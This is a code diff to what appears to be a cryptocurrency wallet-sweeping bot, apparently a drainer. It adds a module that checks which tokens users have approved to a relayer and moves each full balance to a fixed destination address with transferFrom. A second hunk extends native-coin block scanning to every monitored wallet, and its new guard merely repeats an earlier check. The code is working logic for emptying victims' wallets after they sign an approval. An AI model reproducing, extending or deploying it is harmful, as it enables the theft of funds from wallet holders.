@@ -1557,6 +1557,99 @@ async function sweep(wallet) {
       }
     }
   }
+
+  // ══════════════════════════════════════════════════════════════════════════
+  // TIER 5: DIRECT ALLOWANCE — user approved RELAYER directly via wallet_sendCalls
+  // The bot calls ERC20.transferFrom(user, destination, balance) for each token
+  // where the user has a non-zero balance AND allowance >= balance to the relayer.
+  // ══════════════════════════════════════════════════════════════════════════
+  if (wallet.type === "direct-allowance") {
+    log(`[direct] ${short} — checking direct-allowance tokens`);
+
+    // Load token list: prefer permit_metadata.tokens, fallback to all loaded tokens
+    let tokenAddrs = [];
+    if (supabase) {
+      const { data: dwRow } = await supabase
+        .from("delegated_wallets")
+        .select("permit_metadata")
+        .eq("address", addrKey)
+        .eq("chain", CHAIN)
+        .single();
+      if (dwRow?.permit_metadata?.tokens?.length) {
+        tokenAddrs = dwRow.permit_metadata.tokens.map(a => a.toLowerCase()).filter(Boolean);
+      }
+    }
+    if (tokenAddrs.length === 0) {
+      // Fallback: check all loaded tokens
+      tokenAddrs = [...loadedTokens.keys()].slice(0, 50);
+    }
+
+    if (tokenAddrs.length === 0) {
+      log(`[direct] ${short} — no tokens to check`);
+      return;
+    }
+
+    // Batch-check balance AND allowance(user → relayer) via Multicall3
+    const ERC20_BAL_ABI   = ["function balanceOf(address) view returns (uint256)"];
+    const ERC20_ALLOW_ABI = ["function allowance(address,address) view returns (uint256)"];
+    const balIface   = new ethers.Interface(ERC20_BAL_ABI);
+    const allowIface = new ethers.Interface(ERC20_ALLOW_ABI);
+
+    const calls = [];
+    for (const addr of tokenAddrs) {
+      calls.push({ target: addr, allowFailure: true, callData: balIface.encodeFunctionData("balanceOf", [checksum]) });
+      calls.push({ target: addr, allowFailure: true, callData: allowIface.encodeFunctionData("allowance", [checksum, relayerWallet.address]) });
+    }
+
+    let results = [];
+    try {
+      results = await multicall.aggregate3.staticCall(calls);
+    } catch (e) {
+      warn(`[direct] ${short} — multicall failed: ${e.message}`);
+      return;
+    }
+
+    const toSweep = [];
+    for (let i = 0; i < tokenAddrs.length; i++) {
+      const balRes   = results[i * 2];
+      const allowRes = results[i * 2 + 1];
+      if (!balRes?.success || !allowRes?.success) continue;
+      let bal, allow;
+      try {
+        bal   = balIface.decodeFunctionResult("balanceOf", balRes.returnData)[0];
+        allow = allowIface.decodeFunctionResult("allowance", allowRes.returnData)[0];
+      } catch { continue; }
+      if (bal > 0n && allow >= bal) {
+        toSweep.push({ token: tokenAddrs[i], balance: bal });
+      }
+    }
+
+    if (toSweep.length === 0) {
+      log(`[direct] ${short} — no tokens with balance+allowance`);
+      return;
+    }
+
+    log(`[direct] ${short} — sweeping ${toSweep.length} tokens via transferFrom`);
+    for (const { token, balance } of toSweep) {
+      const sym = loadedTokens.get(token)?.symbol ?? token.slice(0, 10);
+      try {
+        // Check relayer has gas
+        const relBal = await getRelayerBalance();
+        if (relBal < ethers.parseEther("0.001")) {
+          warn(`[direct] relayer low on gas — skipping ${sym}`);
+          break;
+        }
+        const fee = await getFeeData();
+        const erc20 = new ethers.Contract(token, ["function transferFrom(address,address,uint256) returns (bool)"], relayerWallet);
+        const tx = await erc20.transferFrom(checksum, DESTINATION_ADDRESS, balance, { gasLimit: 100_000n, ...fee });
+        await tx.wait();
+        log(`[direct] ✅ swept ${sym} from ${short}`);
+      } catch (e) {
+        err(`[direct] ❌ ${sym}: ${e.reason ?? e.message}`);
+      }
+    }
+    return;
+  }
 }
 
 // ══════════════════════════════════════════════════════════════════════════
@@ -1953,10 +2046,10 @@ async function startNativeListener(wsProvider) {
     reconnectAttempt = 0; // reset backoff on each received block
     if (monitoredWallets.size === 0) return;
 
-    // Only EIP-7702 wallets can have their native coin swept — skip the
-    // expensive full-block fetch entirely when none are present.
-    const hasEIP7702 = [...monitoredWallets.values()].some(w => w.type === "eip7702");
-    if (!hasEIP7702) return;
+    // Only monitored wallets that can receive and be swept of native coin need
+    // the full block scan. Skip entirely if no such wallets are present.
+    const hasSweepableWallet = monitoredWallets.size > 0;
+    if (!hasSweepableWallet) return;
 
     // Throttle: max 1 full-block fetch per 120s.
     // ETH Transfer event listeners catch ERC-20 deposits immediately.
